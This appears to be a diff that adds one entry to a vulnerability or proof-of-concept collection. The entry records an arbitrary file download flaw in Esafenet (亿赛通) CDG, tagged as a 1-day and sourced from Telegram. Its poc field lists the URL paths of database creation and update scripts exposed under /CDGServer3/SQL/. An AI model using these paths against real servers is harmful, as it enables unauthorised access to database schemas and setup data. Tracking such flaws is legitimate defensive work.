@@ -1,0 +1,7 @@
+vendor = "亿赛通"
+name = "亿赛通文件下载"
+type = "任意文件下载"
+source = "TG"
+date = "08.15"
+poc = "https://xxx/CDGServer3/SQL/MYSQL/create_SmartSec_mysql.sql /CDGServer3/SQL/MSSQL/ CreateCDGProcedure.sql CreateCDGProcedure1.sql create_SmartSec_mssql.sql create_SmartSec_mssql.txt /CDGServer3/SQL/ORACLE/ create_index_SmartSec_oracle.sql create_SmartSec_oracle.sql create_table_SmartSec_oracle.sql drop_table_SmartSec_oracle.sql initOracleDB.sql /CDGServer3/SQL/ORACLE/updateSQL/ CDG800_update_oracle.sql renminyinhang_oracle.sql"
+label = "1day"
